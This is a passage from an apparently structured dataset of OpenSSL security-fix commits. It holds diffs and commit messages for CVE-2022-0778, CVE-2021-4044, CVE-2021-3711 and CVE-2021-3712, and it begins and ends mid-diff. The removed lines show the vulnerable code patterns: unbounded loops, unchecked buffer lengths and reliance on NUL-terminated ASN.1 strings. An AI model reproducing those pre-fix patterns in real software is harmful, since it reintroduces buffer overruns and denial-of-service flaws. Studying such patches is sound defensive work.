    \ {\n-                ERR_raise(ERR_LIB_BN, BN_R_NOT_A_SQUARE);\n-           \
    \     goto end;\n+        /* Find the smallest i, 0 < i < e, such that b^(2^i)\
    \ = 1. */\n+        for (i = 1; i < e; i++) {\n+            if (i == 1) {\n+ \
    \               if (!BN_mod_sqr(t, b, p, ctx))\n+                    goto end;\n\
    +\n+            } else {\n+                if (!BN_mod_mul(t, t, t, p, ctx))\n\
    +                    goto end;\n             }\n-            if (!BN_mod_mul(t,\
    \ t, t, p, ctx))\n-                goto end;\n+            if (BN_is_one(t))\n\
    +                break;\n+        }\n+        /* If not found, a is not a square\
    \ or p is not prime. */\n+        if (i >= e) {\n+            ERR_raise(ERR_LIB_BN,\
    \ BN_R_NOT_A_SQUARE);\n+            goto end;\n         }\n \n         /* t :=\
    \ y^2^(e - i - 1) */"
  commit_message: 'Fix possible infinite loop in BN_mod_sqrt()


    The calculation in some cases does not finish for non-prime p.


    This fixes CVE-2022-0778.


    Based on patch by David Benjamin <davidben@google.com>.


    Reviewed-by: Paul Dale <pauli@openssl.org>

    Reviewed-by: Matt Caswell <matt@openssl.org>'
  commit_sha: 9eafb53614bf65797db25f467946e735e1b43dc9
  repo_name: openssl/openssl
- commit_diff:
  - "--- a/crypto/x509/x509_vfy.c\n+++ b/crypto/x509/x509_vfy.c\n@@ -630,7 +630,7\
    \ @@ static int has_san_id(X509 *x, int gtype)\n     GENERAL_NAMES *gs = X509_get_ext_d2i(x,\
    \ NID_subject_alt_name, NULL, NULL);\n \n     if (gs == NULL)\n-        return\
    \ -1;\n+        return 0;\n \n     for (i = 0; i < sk_GENERAL_NAME_num(gs); i++)\
    \ {\n         GENERAL_NAME *g = sk_GENERAL_NAME_value(gs, i);"
  commit_message: 'Fix infinite verification loops due to has_san_id


    Where name constraints apply, X509_verify() would incorrectly report an

    internal error in the event that a certificate has no SAN extension.


    CVE-2021-4044


    Reviewed-by: Tomas Mraz <tomas@openssl.org>

    Reviewed-by: Matt Caswell <matt@openssl.org>'
  commit_sha: 6894e20b50c1204bfc990093b4e7ccd10f92865d
  repo_name: openssl/openssl
- commit_diff:
  - "--- a/ssl/ssl_cert.c\n+++ b/ssl/ssl_cert.c\n@@ -362,6 +362,13 @@ void ssl_cert_set_cert_cb(CERT\
    \ *c, int (*cb) (SSL *ssl, void *arg), void *arg)\n     c->cert_cb_arg = arg;\n\
    \ }\n \n+/*\n+ * Verify a certificate chain\n+ * Return codes:\n+ *  1: Verify\
    \ success\n+ *  0: Verify failure or error\n+ * -1: Retry required\n+ */\n int\
    \ ssl_verify_cert_chain(SSL *s, STACK_OF(X509) *sk)\n {\n     X509 *x;\n@@ -423,10\
    \ +430,14 @@ int ssl_verify_cert_chain(SSL *s, STACK_OF(X509) *sk)\n     if (s->verify_callback)\n\
    \         X509_STORE_CTX_set_verify_cb(ctx, s->verify_callback);\n \n-    if (s->ctx->app_verify_callback\
    \ != NULL)\n+    if (s->ctx->app_verify_callback != NULL) {\n         i = s->ctx->app_verify_callback(ctx,\
    \ s->ctx->app_verify_arg);\n-    else\n+    } else {\n         i = X509_verify_cert(ctx);\n\
    +        /* We treat an error in the same way as a failure to verify */\n+   \
    \     if (i < 0)\n+            i = 0;\n+    }\n \n     s->verify_result = X509_STORE_CTX_get_error(ctx);\n\
    \     sk_X509_pop_free(s->verified_chain, X509_free);"
  - "--- a/ssl/statem/statem_clnt.c\n+++ b/ssl/statem/statem_clnt.c\n@@ -1878,7 +1878,7\
    \ @@ WORK_STATE tls_post_process_server_certificate(SSL *s, WORK_STATE wst)\n\
    \      * (less clean) historic behaviour of performing validation if any flag\
    \ is\n      * set. The *documented* interface remains the same.\n      */\n- \
    \   if (s->verify_mode != SSL_VERIFY_NONE && i <= 0) {\n+    if (s->verify_mode\
    \ != SSL_VERIFY_NONE && i == 0) {\n         SSLfatal(s, ssl_x509err2alert(s->verify_result),\n\
    \                  SSL_R_CERTIFICATE_VERIFY_FAILED);\n         return WORK_ERROR;"
  commit_message: 'Fix invalid handling of verify errors in libssl


    In the event that X509_verify() returned an internal error result then

    libssl would mishandle this and set rwstate to SSL_RETRY_VERIFY. This

    subsequently causes SSL_get_error() to return SSL_ERROR_WANT_RETRY_VERIFY.

    That return code is supposed to only ever be returned if an application

    is using an app verify callback to complete replace the use of

    X509_verify(). Applications may not be written to expect that return code

    and could therefore crash (or misbehave in some other way) as a result.


    CVE-2021-4044


    Reviewed-by: Tomas Mraz <tomas@openssl.org>'
  commit_sha: c1c1bb7c5e2baa109baec62d2af09d24caae5557
  repo_name: openssl/openssl
- commit_diff:
  - "--- a/crypto/evp/m_sigver.c\n+++ b/crypto/evp/m_sigver.c\n@@ -411,14 +411,14\
    \ @@ int EVP_DigestSignFinal(EVP_MD_CTX *ctx, unsigned char *sigret,\n     if\
    \ (sigret == NULL || (ctx->flags & EVP_MD_CTX_FLAG_FINALISE) != 0)\n         return\
    \ pctx->op.sig.signature->digest_sign_final(pctx->op.sig.algctx,\n           \
    \                                               sigret, siglen,\n-           \
    \                                              SIZE_MAX);\n+                 \
    \                                        (sigret == NULL) ? 0 : *siglen);\n  \
    \   dctx = EVP_PKEY_CTX_dup(pctx);\n     if (dctx == NULL)\n         return 0;\n\
    \ \n     r = dctx->op.sig.signature->digest_sign_final(dctx->op.sig.algctx,\n\
    \                                                   sigret, siglen,\n-       \
    \                                           SIZE_MAX);\n+                    \
    \                              (sigret == NULL) ? 0 : *siglen);\n     EVP_PKEY_CTX_free(dctx);\n\
    \     return r;\n \n@@ -506,7 +506,8 @@ int EVP_DigestSign(EVP_MD_CTX *ctx, unsigned\
    \ char *sigret, size_t *siglen,\n             && pctx->op.sig.signature != NULL)\
    \ {\n         if (pctx->op.sig.signature->digest_sign != NULL)\n             return\
    \ pctx->op.sig.signature->digest_sign(pctx->op.sig.algctx,\n-                \
    \                                       sigret, siglen, SIZE_MAX,\n+         \
    \                                              sigret, siglen,\n+            \
    \                                           sigret == NULL ? 0 : *siglen,\n  \
    \                                                      tbs, tbslen);\n     } else\
    \ {\n         /* legacy */"
  - "--- a/crypto/evp/p_lib.c\n+++ b/crypto/evp/p_lib.c\n@@ -529,12 +529,14 @@ static\
    \ int get_raw_key_details(const OSSL_PARAM params[], void *arg)\n         if ((p\
    \ = OSSL_PARAM_locate_const(params, OSSL_PKEY_PARAM_PRIV_KEY))\n             \
    \    != NULL)\n             return OSSL_PARAM_get_octet_string(p, (void **)raw_key->key,\n\
    -                                               SIZE_MAX, raw_key->len);\n+  \
    \                                             raw_key->key == NULL ? 0 : *raw_key->len,\n\
    +                                               raw_key->len);\n     } else if\
    \ (raw_key->selection == OSSL_KEYMGMT_SELECT_PUBLIC_KEY) {\n         if ((p =\
    \ OSSL_PARAM_locate_const(params, OSSL_PKEY_PARAM_PUB_KEY))\n                \
    \ != NULL)\n             return OSSL_PARAM_get_octet_string(p, (void **)raw_key->key,\n\
    -                                               SIZE_MAX, raw_key->len);\n+  \
    \                                             raw_key->key == NULL ? 0 : *raw_key->len,\n\
    +                                               raw_key->len);\n     }\n \n  \
    \   return 0;"
  - "--- a/crypto/evp/signature.c\n+++ b/crypto/evp/signature.c\n@@ -582,7 +582,7\
    \ @@ int EVP_PKEY_sign(EVP_PKEY_CTX *ctx,\n         goto legacy;\n \n     ret\
    \ = ctx->op.sig.signature->sign(ctx->op.sig.algctx, sig, siglen,\n-          \
    \                            SIZE_MAX, tbs, tbslen);\n+                      \
    \                (sig == NULL) ? 0 : *siglen, tbs, tbslen);\n \n     return ret;\n\
    \  legacy:"
  commit_message: 'Prevent an overflow if an application supplies a buffer that is
    too small


    If an application bug means that a buffer smaller than is necessary is

    passed to various functions then OpenSSL does not spot that the buffer

    is too small and fills it anyway. This PR prevents that.


    Since it requires an application bug to hit this problem, no CVE is

    allocated.


    Thanks to David Benjamin for reporting this issue.


    Reviewed-by: Tomas Mraz <tomas@openssl.org>

    (Merged from https://github.com/openssl/openssl/pull/16789)'
  commit_sha: 43da9a14f0e73f42f28ae34219929b44df5d1a11
  repo_name: openssl/openssl
- commit_diff:
  - "--- a/crypto/sm2/sm2_crypt.c\n+++ b/crypto/sm2/sm2_crypt.c\n@@ -67,29 +67,21\
    \ @@ static size_t ec_field_size(const EC_GROUP *group)\n     return field_size;\n\
    \ }\n \n-int ossl_sm2_plaintext_size(const EC_KEY *key, const EVP_MD *digest,\n\
    -                            size_t msg_len, size_t *pt_size)\n+int ossl_sm2_plaintext_size(const\
    \ unsigned char *ct, size_t ct_size,\n+                            size_t *pt_size)\n\
    \ {\n-    const size_t field_size = ec_field_size(EC_KEY_get0_group(key));\n-\
    \    const int md_size = EVP_MD_get_size(digest);\n-    size_t overhead;\n+  \
    \  struct SM2_Ciphertext_st *sm2_ctext = NULL;\n \n-    if (md_size < 0) {\n-\
    \        ERR_raise(ERR_LIB_SM2, SM2_R_INVALID_DIGEST);\n-        return 0;\n-\
    \    }\n-    if (field_size == 0) {\n-        ERR_raise(ERR_LIB_SM2, SM2_R_INVALID_FIELD);\n\
    -        return 0;\n-    }\n+    sm2_ctext = d2i_SM2_Ciphertext(NULL, &ct, ct_size);\n\
    \ \n-    overhead = 10 + 2 * field_size + (size_t)md_size;\n-    if (msg_len <=\
    \ overhead) {\n+    if (sm2_ctext == NULL) {\n         ERR_raise(ERR_LIB_SM2,\
    \ SM2_R_INVALID_ENCODING);\n         return 0;\n     }\n \n-    *pt_size = msg_len\
    \ - overhead;\n+    *pt_size = sm2_ctext->C2->length;\n+    SM2_Ciphertext_free(sm2_ctext);\n\
    +\n     return 1;\n }\n "
  - "--- a/providers/implementations/asymciphers/sm2_enc.c\n+++ b/providers/implementations/asymciphers/sm2_enc.c\n\
    @@ -110,7 +110,7 @@ static int sm2_asym_decrypt(void *vpsm2ctx, unsigned char\
    \ *out, size_t *outlen,\n         return 0;\n \n     if (out == NULL) {\n-   \
    \     if (!ossl_sm2_plaintext_size(psm2ctx->key, md, inlen, outlen))\n+      \
    \  if (!ossl_sm2_plaintext_size(in, inlen, outlen))\n             return 0;\n\
    \         return 1;\n     }"
  - "--- a/test/sm2_internal_test.c\n+++ b/test/sm2_internal_test.c\n@@ -183,7 +183,7\
    \ @@ static int test_sm2_crypt(const EC_GROUP *group,\n     if (!TEST_mem_eq(ctext,\
    \ ctext_len, expected, ctext_len))\n         goto done;\n \n-    if (!TEST_true(ossl_sm2_plaintext_size(key,\
    \ digest, ctext_len, &ptext_len))\n+    if (!TEST_true(ossl_sm2_plaintext_size(ctext,\
    \ ctext_len, &ptext_len))\n             || !TEST_int_eq(ptext_len, msg_len))\n\
    \         goto done;\n "
  commit_message: 'Correctly calculate the length of SM2 plaintext given the ciphertext


    Previously the length of the SM2 plaintext could be incorrectly calculated.

    The plaintext length was calculated by taking the ciphertext length and

    taking off an "overhead" value.


    The overhead value was assumed to have a "fixed" element of 10 bytes.

    This is incorrect since in some circumstances it can be more than 10 bytes.

    Additionally the overhead included the length of two integers C1x and C1y,

    which were assumed to be the same length as the field size (32 bytes for

    the SM2 curve). However in some cases these integers can have an additional

    padding byte when the msb is set, to disambiguate them from negative

    integers. Additionally the integers can also be less than 32 bytes in

    length in some cases.


    If the calculated overhead is incorrect and larger than the actual value

    this can result in the calculated plaintext length being too small.

    Applications are likely to allocate buffer sizes based on this and therefore

    a buffer overrun can occur.


    CVE-2021-3711


    Issue reported by John Ouyang.


    Reviewed-by: Paul Dale <pauli@openssl.org>

    Reviewed-by: Nicola Tuveri <nic.tuv@gmail.com>'
  commit_sha: 36cf45ef3ba71e44a8be06ee81cb31aa02cb0010
  repo_name: openssl/openssl
- commit_diff:
  - "--- a/crypto/ec/ec_asn1.c\n+++ b/crypto/ec/ec_asn1.c\n@@ -699,7 +699,8 @@ EC_GROUP\
    \ *EC_GROUP_new_from_ecparameters(const ECPARAMETERS *params)\n \n     if (params->order\
    \ == NULL\n             || params->base == NULL\n-            || params->base->data\
    \ == NULL) {\n+            || params->base->data == NULL\n+            || params->base->length\
    \ == 0) {\n         ERR_raise(ERR_LIB_EC, EC_R_ASN1_ERROR);\n         goto err;\n\
    \     }"
  commit_message: 'Fix EC_GROUP_new_from_ecparameters to check the base length


    Check that there''s at least one byte in params->base before trying to

    read it.


    CVE-2021-3712


    Reviewed-by: Viktor Dukhovni <viktor@openssl.org>

    Reviewed-by: Paul Dale <pauli@openssl.org>

    Reviewed-by: David Benjamin <davidben@google.com>'
  commit_sha: 030c5aba94788f152f9ceef3549815df45bef702
  repo_name: openssl/openssl
- commit_diff:
  - "--- a/crypto/asn1/t_spki.c\n+++ b/crypto/asn1/t_spki.c\n@@ -38,7 +38,7 @@ int\
    \ NETSCAPE_SPKI_print(BIO *out, NETSCAPE_SPKI *spki)\n     }\n     chal = spki->spkac->challenge;\n\
    \     if (chal->length)\n-        BIO_printf(out, \"  Challenge String: %s\\n\"\
    , chal->data);\n+        BIO_printf(out, \"  Challenge String: %.*s\\n\", chal->length,\
    \ chal->data);\n     i = OBJ_obj2nid(spki->sig_algor.algorithm);\n     BIO_printf(out,\
    \ \"  Signature Algorithm: %s\",\n                (i == NID_undef) ? \"UNKNOWN\"\
    \ : OBJ_nid2ln(i));"
  commit_message: 'Fix NETSCAPE_SPKI_print function to not assume NUL terminated strings


    ASN.1 strings may not be NUL terminated. Don''t assume they are.


    CVE-2021-3712


    Reviewed-by: Viktor Dukhovni <viktor@openssl.org>

    Reviewed-by: Paul Dale <pauli@openssl.org>

    Reviewed-by: David Benjamin <davidben@google.com>'
  commit_sha: 7c038a6bcd98d4bbfd2c2892a87a1138d2f7c5f3
  repo_name: openssl/openssl
- commit_diff:
  - "--- a/crypto/x509/v3_utl.c\n+++ b/crypto/x509/v3_utl.c\n@@ -529,17 +529,25 @@\
    \ static int append_ia5(STACK_OF(OPENSSL_STRING) **sk,\n     /* First some sanity\
    \ checks */\n     if (email->type != V_ASN1_IA5STRING)\n         return 1;\n-\
    \    if (!email->data || !email->length)\n+    if (email->data == NULL || email->length\
    \ == 0)\n+        return 1;\n+    if (memchr(email->data, 0, email->length) !=\
    \ NULL)\n         return 1;\n     if (*sk == NULL)\n         *sk = sk_OPENSSL_STRING_new(sk_strcmp);\n\
    \     if (*sk == NULL)\n         return 0;\n+\n+    emtmp = OPENSSL_strndup((char\
    \ *)email->data, email->length);\n+    if (emtmp == NULL)\n+        return 0;\n\
    +\n     /* Don't add duplicates */\n-    if (sk_OPENSSL_STRING_find(*sk, (char\
    \ *)email->data) != -1)\n+    if (sk_OPENSSL_STRING_find(*sk, emtmp) != -1) {\n\
    +        OPENSSL_free(emtmp);\n         return 1;\n-    emtmp = OPENSSL_strdup((char\
    \ *)email->data);\n-    if (emtmp == NULL || !sk_OPENSSL_STRING_push(*sk, emtmp))\
    \ {\n+    }\n+    if (!sk_OPENSSL_STRING_push(*sk, emtmp)) {\n         OPENSSL_free(emtmp);\
    \ /* free on push failure */\n         X509_email_free(*sk);\n         *sk = NULL;"
  commit_message: 'Fix append_ia5 function to not assume NUL terminated strings


    ASN.1 strings may not be NUL terminated. Don''t assume they are.


    CVE-2021-3712


    Reviewed-by: Viktor Dukhovni <viktor@openssl.org>

    Reviewed-by: Paul Dale <pauli@openssl.org>

    Reviewed-by: David Benjamin <davidben@google.com>'
  commit_sha: 98624776c4d501c8badd6f772ab7048ac9191cb9
  repo_name: openssl/openssl
- commit_diff:
  - "--- a/test/cmp_status_test.c\n+++ b/test/cmp_status_test.c\n@@ -58,7 +58,8 @@\
    \ static int execute_PKISI_test(CMP_STATUS_TEST_FIXTURE *fixture)\n     if (!TEST_ptr(statusString\
    \ =\n                   sk_ASN1_UTF8STRING_value(ossl_cmp_pkisi_get0_statusString(si),\n\
    \                                            0))\n-            || !TEST_str_eq(fixture->text,\
    \ (char *)statusString->data))\n+            || !TEST_mem_eq(fixture->text, strlen(fixture->text),\n\
    +                            (char *)statusString->data, statusString->length))\n\
    \         goto end;\n \n     if (!TEST_int_eq(fixture->pkifailure,"
  - "--- a/test/helpers/pkcs12.c\n+++ b/test/helpers/pkcs12.c\n@@ -479,12 +479,15\
    \ @@ static int check_asn1_string(const ASN1_TYPE *av, const char *txt)\n    \
    \     break;\n \n     case V_ASN1_UTF8STRING:\n-        if (!TEST_str_eq(txt,\
    \ (char *)av->value.utf8string->data))\n+        if (!TEST_mem_eq(txt, strlen(txt),\
    \ (char *)av->value.utf8string->data,\n+                         av->value.utf8string->length))\n\
    \             goto err;\n         break;\n \n     case V_ASN1_OCTET_STRING:\n\
    -        if (!TEST_str_eq(txt, (char *)av->value.octet_string->data))\n+     \
    \   if (!TEST_mem_eq(txt, strlen(txt),\n+                         (char *)av->value.octet_string->data,\n\
    +                         av->value.octet_string->length))\n             goto\
    \ err;\n         break;\n "
  - "--- a/test/x509_time_test.c\n+++ b/test/x509_time_test.c\n@@ -382,10 +382,12\
    \ @@ static int test_x509_time(int idx)\n \n     /* if t is not NULL but expected_string\
    \ is NULL, it is an 'OK' case too */\n     if (t != NULL && x509_format_tests[idx].expected_string)\
    \ {\n-        if (!TEST_str_eq((const char *)t->data,\n-                    x509_format_tests[idx].expected_string))\
    \ {\n-            TEST_info(\"test_x509_time(%d) failed: expected_string %s, got\
    \ %s\\n\",\n-                    idx, x509_format_tests[idx].expected_string,\
    \ t->data);\n+        if (!TEST_mem_eq((const char *)t->data, t->length,\n+  \
    \                  x509_format_tests[idx].expected_string,\n+                \
    \    strlen(x509_format_tests[idx].expected_string))) {\n+            TEST_info(\"\
    test_x509_time(%d) failed: expected_string %s, got %.*s\\n\",\n+             \
    \       idx, x509_format_tests[idx].expected_string, t->length,\n+           \
    \         t->data);\n             goto out;\n         }\n     }"
  commit_message: 'Fix test code to not assume NUL terminated strings


    ASN.1 strings may not be NUL terminated. Don''t assume they are.


    CVE-2021-3712


    Reviewed-by: Viktor Dukhovni <viktor@openssl.org>

    Reviewed-by: Paul Dale <pauli@openssl.org>

    Reviewed-by: David Benjamin <davidben@google.com>'
  commit_sha: 1f365708a3318a5f1a395f90c38b584a58d37fb9
  repo_name: openssl/openssl
- commit_diff:
  - "--- a/crypto/cmp/cmp_hdr.c\n+++ b/crypto/cmp/cmp_hdr.c\n@@ -181,7 +181,8 @@ int\
    \ ossl_cmp_hdr_push1_freeText(OSSL_CMP_PKIHEADER *hdr, ASN1_UTF8STRING *text)\n\
    \         return 0;\n \n     return\n-        ossl_cmp_sk_ASN1_UTF8STRING_push_str(hdr->freeText,\
    \ (char *)text->data);\n+        ossl_cmp_sk_ASN1_UTF8STRING_push_str(hdr->freeText,\
    \ (char *)text->data,\n+                                             text->length);\n\
    \ }\n \n int ossl_cmp_hdr_generalInfo_push0_item(OSSL_CMP_PKIHEADER *hdr,"
  - "--- a/crypto/cmp/cmp_msg.c\n+++ b/crypto/cmp/cmp_msg.c\n@@ -758,13 +758,13 @@\
    \ OSSL_CMP_MSG *ossl_cmp_error_new(OSSL_CMP_CTX *ctx, const OSSL_CMP_PKISI *si,\n\
    \             goto err;\n         msg->body->value.error->errorDetails = ft;\n\
    \         if (lib != NULL && *lib != '\\0'\n-                && !ossl_cmp_sk_ASN1_UTF8STRING_push_str(ft,\
    \ lib))\n+                && !ossl_cmp_sk_ASN1_UTF8STRING_push_str(ft, lib, -1))\n\
    \             goto err;\n         if (reason != NULL && *reason != '\\0'\n-  \
    \              && !ossl_cmp_sk_ASN1_UTF8STRING_push_str(ft, reason))\n+      \
    \          && !ossl_cmp_sk_ASN1_UTF8STRING_push_str(ft, reason, -1))\n       \
    \      goto err;\n         if (details != NULL\n-                && !ossl_cmp_sk_ASN1_UTF8STRING_push_str(ft,\
    \ details))\n+                && !ossl_cmp_sk_ASN1_UTF8STRING_push_str(ft, details,\
    \ -1))\n             goto err;\n     }\n "
  - "--- a/crypto/cmp/cmp_status.c\n+++ b/crypto/cmp/cmp_status.c\n@@ -220,7 +220,8\
    \ @@ char *snprint_PKIStatusInfo_parts(int status, int fail_info,\n         ADVANCE_BUFFER;\n\
    \         for (i = 0; i < n_status_strings; i++) {\n             text = sk_ASN1_UTF8STRING_value(status_strings,\
    \ i);\n-            printed_chars = BIO_snprintf(write_ptr, bufsize, \"\\\"%s\\\
    \"%s\",\n+            printed_chars = BIO_snprintf(write_ptr, bufsize, \"\\\"\
    %.*s\\\"%s\",\n+                                         ASN1_STRING_length(text),\n\
    \                                          ASN1_STRING_get0_data(text),\n    \
    \                                      i < n_status_strings - 1 ? \", \" : \"\"\
    );\n             ADVANCE_BUFFER;"
  - "--- a/crypto/cmp/cmp_util.c\n+++ b/crypto/cmp/cmp_util.c\n@@ -221,15 +221,15\
    \ @@ int ossl_cmp_X509_STORE_add1_certs(X509_STORE *store, STACK_OF(X509) *certs,\n\
    \ }\n \n int ossl_cmp_sk_ASN1_UTF8STRING_push_str(STACK_OF(ASN1_UTF8STRING) *sk,\n\
    -                                         const char *text)\n+               \
    \                          const char *text, int len)\n {\n     ASN1_UTF8STRING\
    \ *utf8string;\n \n     if (!ossl_assert(sk != NULL && text != NULL))\n      \
    \   return 0;\n     if ((utf8string = ASN1_UTF8STRING_new()) == NULL)\n      \
    \   return 0;\n-    if (!ASN1_STRING_set(utf8string, text, -1))\n+    if (!ASN1_STRING_set(utf8string,\
    \ text, len))\n         goto err;\n     if (!sk_ASN1_UTF8STRING_push(sk, utf8string))\n\
    \         goto err;"
  commit_message: 'Fix CMP code to not assume NUL terminated strings


    ASN.1 strings may not be NUL terminated. Don''t assume they are.


    CVE-2021-3712


    Reviewed-by: Viktor Dukhovni <viktor@openssl.org>

    Reviewed-by: Paul Dale <pauli@openssl.org>

    Reviewed-by: David Benjamin <davidben@google.com>'
  commit_sha: 95f8c1e142df835d03b5b62521383a462fc5470d
  repo_name: openssl/openssl
- commit_diff:
  - "--- a/crypto/x509/v3_ncons.c\n+++ b/crypto/x509/v3_ncons.c\n@@ -66,8 +66,31 @@\
    \ ASN1_SEQUENCE(NAME_CONSTRAINTS) = {\n IMPLEMENT_ASN1_ALLOC_FUNCTIONS(GENERAL_SUBTREE)\n\
    \ IMPLEMENT_ASN1_ALLOC_FUNCTIONS(NAME_CONSTRAINTS)\n \n+\n+#define IA5_OFFSET_LEN(ia5base,\
    \ offset) \\\n+    ((ia5base)->length - ((unsigned char *)(offset) - (ia5base)->data))\n\
    +\n+/* Like memchr but for ASN1_IA5STRING. Additionally you can specify the\n\
    + * starting point to search from\n+ */\n+# define ia5memchr(str, start, c) memchr(start,\
    \ c, IA5_OFFSET_LEN(str, start))\n+\n+/* Like memrrchr but for ASN1_IA5STRING\
    \ */\n+static char *ia5memrchr(ASN1_IA5STRING *str, int c)\n+{\n+    int i;\n\
    +\n+    for (i = str->length; i > 0 && str->data[i - 1] != c; i--);\n+\n+    if\
    \ (i == 0)\n+        return NULL;\n+\n+    return (char *)&str->data[i - 1];\n\
    +}\n+\n /*\n- * We cannot use strncasecmp here because that applies locale specific\
    \ rules.\n+ * We cannot use strncasecmp here because that applies locale specific\
    \ rules. It\n+ * also doesn't work with ASN1_STRINGs that may have embedded NUL\
    \ characters.\n  * For example in Turkish 'I' is not the uppercase character for\
    \ 'i'. We need to\n  * do a simple ASCII case comparison ignoring the locale (that\
    \ is why we use\n  * numeric constants below).\n@@ -92,20 +115,12 @@ static int\
    \ ia5ncasecmp(const char *s1, const char *s2, size_t n)\n \n             /* c1\
    \ > c2 */\n             return 1;\n-        } else if (*s1 == 0) {\n-        \
    \    /* If we get here we know that *s2 == 0 too */\n-            return 0;\n\
    \         }\n     }\n \n     return 0;\n }\n \n-static int ia5casecmp(const char\
    \ *s1, const char *s2)\n-{\n-    return ia5ncasecmp(s1, s2, SIZE_MAX);\n-}\n-\n\
    \ static void *v2i_NAME_CONSTRAINTS(const X509V3_EXT_METHOD *method,\n       \
    \                            X509V3_CTX *ctx, STACK_OF(CONF_VALUE) *nval)\n {\n\
    @@ -334,7 +349,7 @@ static int cn2dnsid(ASN1_STRING *cn, unsigned char **dnsid,\
    \ size_t *idlen)\n         --utf8_length;\n \n     /* Reject *embedded* NULs */\n\
    -    if ((size_t)utf8_length != strlen((char *)utf8_value)) {\n+    if (memchr(utf8_value,\
    \ 0, utf8_length) != NULL) {\n         OPENSSL_free(utf8_value);\n         return\
    \ X509_V_ERR_UNSUPPORTED_NAME_SYNTAX;\n     }\n@@ -571,8 +586,12 @@ static int\
    \ nc_dns(ASN1_IA5STRING *dns, ASN1_IA5STRING *base)\n     char *dnsptr = (char\
    \ *)dns->data;\n \n     /* Empty matches everything */\n-    if (*baseptr == '\\\
    0')\n+    if (base->length == 0)\n         return X509_V_OK;\n+\n+    if (dns->length\
    \ < base->length)\n+        return X509_V_ERR_PERMITTED_VIOLATION;\n+\n     /*\n\
    \      * Otherwise can add zero or more components on the left so compare RHS\n\
    \      * and if dns is longer and expect '.' as preceding character.\n@@ -583,7\
    \ +602,7 @@ static int nc_dns(ASN1_IA5STRING *dns, ASN1_IA5STRING *base)\n   \
    \          return X509_V_ERR_PERMITTED_VIOLATION;\n     }\n \n-    if (ia5casecmp(baseptr,\
    \ dnsptr))\n+    if (ia5ncasecmp(baseptr, dnsptr, base->length))\n         return\
    \ X509_V_ERR_PERMITTED_VIOLATION;\n \n     return X509_V_OK;\n@@ -600,63 +619,90\
    \ @@ static int nc_dns(ASN1_IA5STRING *dns, ASN1_IA5STRING *base)\n static int\
    \ nc_email_eai(ASN1_TYPE *emltype, ASN1_IA5STRING *base)\n {\n     ASN1_UTF8STRING\
    \ *eml;\n-    const char *baseptr = (char *)base->data;\n+    char *baseptr =\
    \ NULL;\n     const char *emlptr;\n     const char *emlat;\n     char ulabel[256];\n\
    \     size_t size = sizeof(ulabel) - 1;\n+    int ret = X509_V_OK;\n+    size_t\
    \ emlhostlen;\n \n-    if (emltype->type != V_ASN1_UTF8STRING)\n+    /* We do\
    \ not accept embedded NUL characters */\n+    if (base->length > 0 && memchr(base->data,\
    \ 0, base->length) != NULL)\n         return X509_V_ERR_UNSUPPORTED_NAME_SYNTAX;\n\
    \ \n+    /* 'base' may not be NUL terminated. Create a copy that is */\n+    baseptr\
    \ = OPENSSL_strndup((char *)base->data, base->length);\n+    if (baseptr == NULL)\n\
    +        return X509_V_ERR_OUT_OF_MEM;\n+\n+    if (emltype->type != V_ASN1_UTF8STRING)\
    \ {\n+        ret = X509_V_ERR_UNSUPPORTED_NAME_SYNTAX;\n+        goto end;\n\
    +    }\n+\n     eml = emltype->value.utf8string;\n     emlptr = (char *)eml->data;\n\
    -    emlat = strrchr(emlptr, '@');\n+    emlat = ia5memrchr(eml, '@');\n \n- \
    \   if (emlat == NULL)\n-        return X509_V_ERR_UNSUPPORTED_NAME_SYNTAX;\n\
    +    if (emlat == NULL) {\n+        ret = X509_V_ERR_UNSUPPORTED_NAME_SYNTAX;\n\
    +        goto end;\n+    }\n \n     memset(ulabel, 0, sizeof(ulabel));\n     /*\
    \ Special case: initial '.' is RHS match */\n     if (*baseptr == '.') {\n   \
    \      ulabel[0] = '.';\n         size -= 1;\n-        if (ossl_a2ulabel(baseptr,\
    \ ulabel + 1, &size) <= 0)\n-            return X509_V_ERR_UNSPECIFIED;\n+   \
    \     if (ossl_a2ulabel(baseptr, ulabel + 1, &size) <= 0) {\n+            ret\
    \ = X509_V_ERR_UNSPECIFIED;\n+            goto end;\n+        }\n \n-        if\
    \ ((size_t)eml->length > size + 1) {\n-            emlptr += eml->length - (size\
    \ + 1);\n-            if (ia5casecmp(ulabel, emlptr) == 0)\n-                return\
    \ X509_V_OK;\n+        if ((size_t)eml->length > strlen(ulabel)) {\n+        \
    \    emlptr += eml->length - (strlen(ulabel));\n+            /* X509_V_OK */\n\
    +            if (ia5ncasecmp(ulabel, emlptr, strlen(ulabel)) == 0)\n+        \
    \        goto end;\n         }\n-        return X509_V_ERR_PERMITTED_VIOLATION;\n\
    +        ret = X509_V_ERR_PERMITTED_VIOLATION;\n+        goto end;\n     }\n \n\
    -    emlptr = emlat + 1;\n-    if (ossl_a2ulabel(baseptr, ulabel, &size) <= 0)\n\
    -        return X509_V_ERR_UNSPECIFIED;\n+    if (ossl_a2ulabel(baseptr, ulabel,\
    \ &size) <= 0) {\n+        ret = X509_V_ERR_UNSPECIFIED;\n+        goto end;\n\
    +    }\n     /* Just have hostname left to match: case insensitive */\n-    if\
    \ (ia5casecmp(ulabel, emlptr))\n-        return X509_V_ERR_PERMITTED_VIOLATION;\n\
    -\n-    return X509_V_OK;\n+    emlptr = emlat + 1;\n+    emlhostlen = IA5_OFFSET_LEN(eml,\
    \ emlptr);\n+    if (emlhostlen != strlen(ulabel)\n+            || ia5ncasecmp(ulabel,\
    \ emlptr, emlhostlen) != 0) {\n+        ret = X509_V_ERR_PERMITTED_VIOLATION;\n\
    +        goto end;\n+    }\n \n+ end:\n+    OPENSSL_free(baseptr);\n+    return\
    \ ret;\n }\n \n static int nc_email(ASN1_IA5STRING *eml, ASN1_IA5STRING *base)\n\
    \ {\n     const char *baseptr = (char *)base->data;\n     const char *emlptr =\
    \ (char *)eml->data;\n+    const char *baseat = ia5memrchr(base, '@');\n+    const\
    \ char *emlat = ia5memrchr(eml, '@');\n+    size_t basehostlen, emlhostlen;\n\
    \ \n-    const char *baseat = strrchr(baseptr, '@');\n-    const char *emlat =\
    \ strrchr(emlptr, '@');\n     if (!emlat)\n         return X509_V_ERR_UNSUPPORTED_NAME_SYNTAX;\n\
    \     /* Special case: initial '.' is RHS match */\n-    if (!baseat && (*baseptr\
    \ == '.')) {\n+    if (!baseat && base->length > 0 && (*baseptr == '.')) {\n \
    \        if (eml->length > base->length) {\n             emlptr += eml->length\
    \ - base->length;\n-            if (ia5casecmp(baseptr, emlptr) == 0)\n+     \
